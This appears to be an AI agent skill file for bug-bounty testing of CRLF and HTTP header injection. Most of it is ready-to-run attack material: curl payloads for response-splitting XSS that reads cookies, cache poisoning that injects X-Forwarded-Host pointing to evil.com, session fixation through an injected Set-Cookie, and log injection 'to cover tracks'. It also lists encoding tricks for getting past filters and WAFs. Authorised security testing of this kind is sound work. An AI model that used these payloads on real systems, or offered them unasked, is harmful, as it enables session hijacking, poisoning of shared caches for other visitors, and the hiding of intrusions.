---
name: crlf-injection
description: "CRLF and HTTP header injection testing on redirect URLs, Host header, and path segments to reach response-splitting XSS, cache poisoning via injected X-Forwarded-Host, Set-Cookie session fixation, and security-header stripping. Use when a parameter lands in a Location or Set-Cookie header, or when testing redirect, locale, and language parameters."
---

# CRLF Injection / HTTP Header Injection

## Crown Jewel Targets

- **Response splitting XSS** — inject `Content-Type: text/html` + `<script>` via double CRLF for full script execution
- **Cache poisoning via injected headers** — poison CDN cache with injected `X-Forwarded-Host` affecting all subsequent visitors
- **Session fixation** — inject `Set-Cookie: session=ATTACKER_ID` forcing victim onto attacker's session
- **CSP/X-Frame-Options removal** — inject headers that override security headers, enabling downstream XSS or clickjacking
- **Protocol smuggling** — CRLF in URL path enables command injection into Redis/Memcached via SSRF (cross-reference with ssrf-protocol-smuggling-chain)
- **Log injection** — fake log entries to cover tracks or inject XSS into admin log viewer

## Attack Surface Signals

- Redirect endpoints with user-controlled URLs (`/redirect?url=`, `/goto?path=`)
- Host header reflected in response (check for CRLF in Host value)
- Path segments reflected in response headers (Location, Set-Cookie)
- Node.js backends (older versions vulnerable to Unicode CRLF U+010D/U+010A)
- PHP `header()` function with user input
- Nginx `$uri` (decoded) vs `$request_uri` (raw) in rewrite rules
- Responses with user input reflected in any HTTP header

## Why 35% Accept Rate

Most CRLF reports are rejected because:
- Modern frameworks auto-sanitize CRLF in headers
- "Reflected header" alone = informational
- Must prove exploitation chain (XSS, cache poisoning, session fixation)
- Many proxies/CDNs strip injected headers

## Detection

```bash
# Basic CRLF test (check for header injection)
curl -sI "https://target.com/redirect?url=https://example.com%0d%0aInjected-Header:true" | grep -i "injected"

# URL-encoded variants
%0d%0a          # \r\n (standard)
%0a             # \n only (some servers accept)
%0d             # \r only
%E5%98%8A%E5%98%8D  # Unicode CRLF
%0D%0A          # uppercase
\r\n            # literal (some parsers)

# Test in various injection points
# Redirect URLs, Host header, custom headers, path segments
```

## Exploitation Chains

### 1. CRLF → XSS (via response splitting)
```bash
# Inject a complete response body with XSS
curl -v "https://target.com/redirect?url=https://example.com%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(document.cookie)</script>"

# If successful, server returns:
# HTTP/1.1 302 Found
# Location: https://example.com
# Content-Type: text/html
#
# <script>alert(document.cookie)</script>
```

### 2. CRLF → Cache Poisoning
```bash
# Inject headers that poison CDN/proxy cache
curl "https://target.com/page%0d%0aX-Forwarded-Host:%20evil.com" \
  -H "X-Forwarded-For: 127.0.0.1"

# If CDN caches the response with injected headers,
# subsequent users get poisoned response
```

### 3. CRLF → Session Fixation
```bash
# Inject Set-Cookie header
curl -v "https://target.com/path%0d%0aSet-Cookie:%20session=ATTACKER_SESSION_ID"

# Victim visits poisoned URL → gets attacker's session cookie
# Attacker logs in with that session → session fixation
```

### 4. CRLF → Log Injection
```bash
# Inject fake log entries to cover tracks or inject XSS into log viewer
curl "https://target.com/%0d%0a200 OK%0d%0aFake-Entry: admin login successful"
```

## Bypass Techniques

### Encoding variations
```
%0d%0a                    → standard CRLF
%0D%0A                    → uppercase
%e5%98%8a%e5%98%8d        → Unicode CRLF (U+560A, U+560D)
%0d%0a%0d%0a              → double CRLF (body injection)
\r\n                      → literal (some Node.js parsers)
%c0%8d%c0%8a              → overlong UTF-8
%25%30%64%25%30%61        → double URL encode
```

### Framework-specific vectors
```bash
# Node.js HTTP/1.1 (older versions)
# Unicode chars U+010D and U+010A treated as \r\n
curl "https://target.com/path" -H $'Header: value\xc4\x8d\xc4\x8aInjected: true'

# PHP header() function
# Newlines in user input passed to header()
https://target.com/redirect.php?url=http://example.com%0d%0aSet-Cookie:+evil=1

# Nginx $uri (decoded) vs $request_uri (raw)
# If rewrite uses $uri, CRLF may work
```

## Impact Requirements

**CRLF alone = usually rejected.** Must demonstrate:
1. **XSS**: Script execution via response splitting
2. **Cache poisoning**: Prove poisoned cache affects other users
3. **Session fixation**: Full attack chain with session takeover
4. **Header override**: Security header bypass (CSP, X-Frame-Options removal)

**NOT sufficient**: "I can inject a header" without impact.

## Triage Checklist

- [ ] CRLF injection confirmed (injected header appears in response)
- [ ] Impact chain demonstrated (XSS, cache poison, session fix)
- [ ] Tested via browser (not just curl — browser behavior matters)
- [ ] CDN/proxy behavior verified (injection survives intermediaries?)
- [ ] Specific encoding used documented
- [ ] Not mitigated by WAF in real scenario

---

## Operator Notes (Battle-Tested)

- **CRLF alone is almost always rejected** — 35% accept rate means you MUST demonstrate exploitation chain (XSS, cache poisoning, session fixation). "I can inject a header" without impact = waste of time
- **Try Unicode CRLF when standard encoding fails** — `%E5%98%8A%E5%98%8D` (U+560A, U+560D) bypasses many filters that only block `%0d%0a`
- **Double URL-encode for proxy chains** — `%250d%250a` gets decoded once by proxy, arrives as `%0d%0a` at backend
- **Node.js Unicode bypass is version-specific** — older Node.js versions treat `\xc4\x8d\xc4\x8a` as CRLF. Check Node version in headers/errors
- **Test via browser, not just curl** — curl may show injection but browser may not render it due to content sniffing or CSP. Browser verification is mandatory
- **Cache poisoning requires CDN verification** — inject headers, then fetch same URL from different IP/session to confirm CDN cached the poisoned response
- **Cross-reference with SSRF protocol smuggling** — CRLF in URL path + SSRF = command injection into Redis/Memcached (see ssrf-protocol-smuggling-chain)

## Related Skills & Chains

| Situation | Pattern / Skill |
|-----------|----------------|
| CRLF + CDN = cache poisoning | `cache-poisoning` |
| CRLF in SSRF URL for protocol smuggling | `ssrf-testing` → `references/ssrf-protocol-smuggling-chain.md` |
| Host header injection angle | `host-header-attacks` |
| Redirect endpoint found | `open-redirect` |
| WAF blocking CRLF payloads | `waf-bypass` → `references/waf-generic-evasion.md` |
| Chain escalation matrix | `auto-chain-discovery` |
